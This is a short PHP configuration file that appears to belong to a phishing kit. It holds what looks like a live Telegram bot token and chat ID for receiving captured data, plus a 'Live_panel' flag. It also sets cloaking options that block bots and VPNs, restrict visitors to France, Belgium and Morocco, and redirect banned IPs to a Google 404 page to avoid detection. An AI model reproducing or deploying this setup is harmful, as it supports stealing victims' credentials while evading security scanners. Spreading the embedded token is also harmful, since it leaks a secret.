<?php
// Telegram Bot API Token
// IMPORTANT: Replace 'YOUR_TELEGRAM_BOT_TOKEN' with your actual bot token.
define('TOKEN', '7857615924:AAEwKzHFFm62F8fOO3tQCiw_cDb0YqhwWaU'); 


define('CHATID', '7891857065'); 


$Live_panel = true; 


$config = [
   'settings' => [
       'block_bots' => true, // Block known bots
       'block_vpn' => false, // Block VPNs (requires additional service/API)
       'block_country' => false, // Block specific countries
       'block_mobile' => false, // Block mobile devices
       'block_desktop' => false, // Block desktop devices
       'allowed_countries' => ['FR', 'BE', 'MA'], // Countries allowed if block_country is true
       'ban_list_path' => 'ban.txt', // Path to the IP ban list
       'error_page_redirect' => 'https://google.com/404', // Page to redirect banned IPs
   ],
   'telegram' => [
       'api_url' => 'https://api.telegram.org/bot',
   ],
];
?>
